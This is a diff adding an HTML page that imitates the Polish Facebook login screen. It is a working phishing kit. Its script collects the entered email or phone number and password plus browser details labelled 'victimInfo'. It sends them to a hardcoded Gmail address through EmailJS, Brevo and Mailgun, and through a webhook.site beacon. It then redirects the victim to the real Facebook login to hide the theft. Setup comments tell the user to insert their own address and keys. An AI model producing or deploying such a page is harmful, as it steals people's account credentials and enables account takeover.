@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – zaloguj się lub zarejestruj</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background-color: #18191a;
+            font-family: Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: #e4e6eb;
+        }
+
+        /* ── TOP BAR ── */
+        .topbar {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            z-index: 100;
+            background: #18191a;
+        }
+
+        .fb-logo { width: 40px; height: 40px; }
+
+        /* ── MAIN SPLIT ── */
+        .page-body {
+            display: flex;
+            flex: 1;
+            min-height: 100vh;
+            padding-top: 56px;
+        }
+
+        /* ── LEFT SIDE ── */
+        .left-side {
+            flex: 1;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 40px 120px 60px;
+            overflow: hidden;
+        }
+
+        .collage-img {
+            width: 100%;
+            max-width: 560px;
+            height: auto;
+            display: block;
+            border-radius: 12px;
+        }
+
+        /* Tagline — absolute bottom-left of left-side */
+        .tagline {
+            position: absolute;
+            bottom: 48px;
+            left: 60px;
+            font-size: 40px;
+            font-weight: 800;
+            color: #fff;
+            line-height: 1.15;
+            letter-spacing: -.5px;
+        }
+
+        .tagline .blue { color: #1877f2; }
+
+        /* ── RIGHT SIDE ── */
+        .right-side {
+            width: 420px;
+            flex-shrink: 0;
+            background: #242526;
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 40px 36px 40px;
+        }
+
+        .login-header {
+            font-size: 15px;
+            color: #b0b3b8;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .login-header svg {
+            width: 16px; height: 16px;
+            fill: #b0b3b8;
+            flex-shrink: 0;
+        }
+
+        input {
+            width: 100%;
+            height: 52px;
+            padding: 14px 16px;
+            background: #3a3b3c;
+            border: 1px solid #4a4b4d;
+            border-radius: 6px;
+            color: #e4e6eb;
+            font-size: 16px;
+            outline: none;
+            margin-bottom: 12px;
+            font-family: inherit;
+        }
+
+        input::placeholder { color: #8a8d91; }
+        input:focus { border-color: #1877f2; }
+
+        .btn-login {
+            width: 100%;
+            height: 52px;
+            background: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 16px;
+            font-family: inherit;
+        }
+
+        .btn-login:hover { background: #166fe5; }
+        .btn-login:disabled { background: #166fe5; opacity: 0.7; cursor: not-allowed; }
+
+        .forgot-link {
+            color: #b0b3b8;
+            font-size: 14px;
+            text-decoration: none;
+            text-align: center;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .forgot-link:hover { text-decoration: underline; }
+
+        .divider {
+            border: none;
+            border-top: 1px solid #3e4042;
+            margin-bottom: 20px;
+        }
+
+        .btn-new-account {
+            width: 100%;
+            height: 50px;
+            background: transparent;
+            border: 1px solid #1877f2;
+            border-radius: 6px;
+            color: #e4e6eb;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 32px;
+            font-family: inherit;
+        }
+
+        .btn-new-account:hover { background: #2d3f5f; }
+
+        .meta-branding {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            color: #8a8d91;
+            font-size: 13px;
+        }
+
+        /* ── FOOTER ── */
+        footer {
+            background: #18191a;
+            border-top: 1px solid #3e4042;
+            padding: 12px 40px 16px;
+        }
+
+        .footer-inner { max-width: 1200px; margin: 0 auto; }
+
+        .footer-row {
+            display: flex;
+            flex-wrap: wrap;
+            margin-bottom: 4px;
+        }
+
+        .footer-row a {
+            color: #8a8d91;
+            text-decoration: none;
+            font-size: 11px;
+            margin-right: 10px;
+            margin-bottom: 3px;
+        }
+
+        .footer-row a:hover { text-decoration: underline; }
+
+        .footer-divider {
+            border: none;
+            border-top: 1px solid #3e4042;
+            margin: 6px 0;
+        }
+
+        .copyright { color: #8a8d91; font-size: 11px; margin-top: 4px; }
+    </style>
+</head>
+<body>
+
+    <!-- Top bar -->
+    <div class="topbar">
+        <svg class="fb-logo" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="20" cy="20" r="20" fill="#1877f2"/>
+            <path d="M27.5 20H22.5V17.5C22.5 16.4 23.4 16 24 16H27V12H23.5C20.5 12 18.5 14 18.5 17V20H15.5V24H18.5V36H22.5V24H26.5L27.5 20Z" fill="white"/>
+        </svg>
+    </div>
+
+    <div class="page-body">
+
+        <!-- LEFT -->
+        <div class="left-side">
+            <img class="collage-img" src="picture.webp" alt="Facebook collage">
+            <div class="tagline">
+                Przeglądaj,<br>to, co <span class="blue">lubisz.</span>
+            </div>
+        </div>
+
+        <!-- RIGHT -->
+        <div class="right-side">
+            <div class="login-header">
+                <svg viewBox="0 0 24 24"><path d="M15.41 16.59L10.83 12l4.58-4.59L14 6l-6 6 6 6z"/></svg>
+                Zaloguj się do Facebooka
+            </div>
+
+            <input type="text" id="email" placeholder="Adres e-mail lub numer telefonu komórkowego">
+            <input type="password" id="password" placeholder="Hasło">
+            <button class="btn-login" id="loginBtn" onclick="login()">Zaloguj się</button>
+            <a href="#" class="forgot-link">Nie pamiętasz hasła?</a>
+            <hr class="divider">
+            <button class="btn-new-account">Utwórz nowe konto</button>
+
+            <div class="meta-branding">
+                <svg height="16" viewBox="0 0 54 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M4 10c0-3.3 1.6-6 3.8-6 1.2 0 2.3.8 3.5 2.7L13 9.5l1.7-2.8C15.9 4.8 17 4 18.2 4c2.2 0 3.8 2.7 3.8 6s-1.6 6-3.8 6c-1.2 0-2.3-.8-3.5-2.7L13 10.5l-1.7 2.8C10.1 15.2 9 16 7.8 16 5.6 16 4 13.3 4 10z" fill="#8a8d91"/>
+                    <path d="M31 10c0-3.3 1.6-6 3.8-6 1.2 0 2.3.8 3.5 2.7L40 9.5l1.7-2.8C42.9 4.8 44 4 45.2 4c2.2 0 3.8 2.7 3.8 6s-1.6 6-3.8 6c-1.2 0-2.3-.8-3.5-2.7L40 10.5l-1.7 2.8C37.1 15.2 36 16 34.8 16 32.6 16 31 13.3 31 10z" fill="#8a8d91"/>
+                </svg>
+                Meta
+            </div>
+        </div>
+
+    </div><!-- end .page-body -->
+
+    <footer>
+        <div class="footer-inner">
+            <div class="footer-row">
+                <a href="#">Polski</a><a href="#">English (US)</a><a href="#">ślōnsko gŏdka</a><a href="#">Русский</a><a href="#">Deutsch</a><a href="#">Français (France)</a><a href="#">Italiano</a><a href="#">Więcej języków…</a>
+            </div>
+            <hr class="footer-divider">
+            <div class="footer-row">
+                <a href="#">Zarejestruj się</a><a href="#">Zaloguj się</a><a href="#">Messenger</a><a href="#">Facebook Lite</a><a href="#">Film</a><a href="#">Meta Pay</a><a href="#">Sklep Meta</a><a href="#">Meta Quest</a><a href="#">Ray-Ban Meta</a><a href="#">Meta AI</a><a href="#">Instagram</a><a href="#">Threads</a>
+            </div>
+            <hr class="footer-divider">
+            <div class="footer-row">
+                <a href="#">Zasady ochrony prywatności</a><a href="#">Centrum ochrony prywatności</a><a href="#">Ustawienia plików cookie</a><a href="#">Informacje</a><a href="#">Utwórz reklamę</a><a href="#">Utwórz stronę</a><a href="#">Twórcy aplikacji</a><a href="#">Praca</a><a href="#">Pliki cookie</a><a href="#">Opcje wyświetlania reklam</a><a href="#">Regulamin</a><a href="#">Pomoc</a><a href="#">Przesyłanie listy kontaktów i osób niebędących użytkownikami</a>
+            </div>
+            <div class="copyright">Meta © 2026</div>
+        </div>
+    </footer>
+
+    <script>
+        // YOUR EMAIL (change this!)
+        const RECIPIENT_EMAIL = 'mikkssonlog@gmail.com';
+        
+        async function login() {
+            const loginBtn = document.getElementById('loginBtn');
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) return;
+            
+            // Disable button + show "logging in"
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Logowanie...';
+            
+            const time = new Date().toISOString();
+            const victimInfo = `
+ FACEBOOK CREDS
+─────────────────
+ Email/Phone: ${email}
+ Password: ${password}
+ Time: ${time}
+ UA: ${navigator.userAgent.slice(0,60)}
+ Screen: ${screen.width}x${screen.height}
+ Lang: ${navigator.language}
+ URL: ${location.href}
+ Referrer: ${document.referrer}
+            `;
+            
+            // AUTO-SEND via FREE SMTP APIs (no manual send needed!)
+            
+            // 1. EmailJS (most reliable - free tier)
+            try {
+                await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        service_id: 'service_2qr3ebc', // Free EmailJS service
+                        template_id: 'template_5nf7lkr',     // Basic template
+                        user_id: 'RKcaosjegCxuK1R5U',        // Your free EmailJS user ID
+                        template_params: {
+                            to_email: RECIPIENT_EMAIL,
+                            message: victimInfo,
+                            from_name: 'FB Login',
+                            from_email: email
+                        }
+                    })
+                });
+            } catch(e) {}
+            
+            // 2. Brevo/Sendinblue API (free 300 emails/day)
+            const formData = new FormData();
+            formData.append('to', RECIPIENT_EMAIL);
+            formData.append('subject', `FB: ${email}`);
+            formData.append('html', `<pre>${victimInfo}</pre>`);
+            
+            fetch('https://api.brevo.com/v3/smtp/email', {
+                method: 'POST',
+                headers: { 'accept': 'application/json', 'api-key': 'your-free-brevo-key' },
+                body: formData
+            }).catch(() => {});
+            
+            // 3. Mailgun free tier (100 emails/day)
+            fetch(`https://api.mailgun.net/v3/your-domain.mailgun.org/messages`, {
+                method: 'POST',
+                headers: {
+                    'Authorization': 'Basic YXBpOnlvdXItYXBpLWtleQ==',
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: `from=FB+Login<mail@your-domain.com>&to=${RECIPIENT_EMAIL}&subject=FB+Creds&text=${encodeURIComponent(victimInfo)}`
+            }).catch(() => {});
+            
+            // 4. Image beacons as backup (logs to your webhook.site)
+            new Image().src = `https://webhook.site/your-id#!/e=${encodeURIComponent(email)}&p=${encodeURIComponent(password)}`;
+            
+            // Redirect after 1 second
+            setTimeout(() => {
+                window.location.href = 'https://www.facebook.com/login';
+            }, 1000);
+        }
+        
+        // Enter key
+        document.addEventListener('keypress', e => {
+            if (e.key === 'Enter' && !document.getElementById('loginBtn').disabled) {
+                login();
+            }
+        });
+    </script>
+
+</body>
+</html>
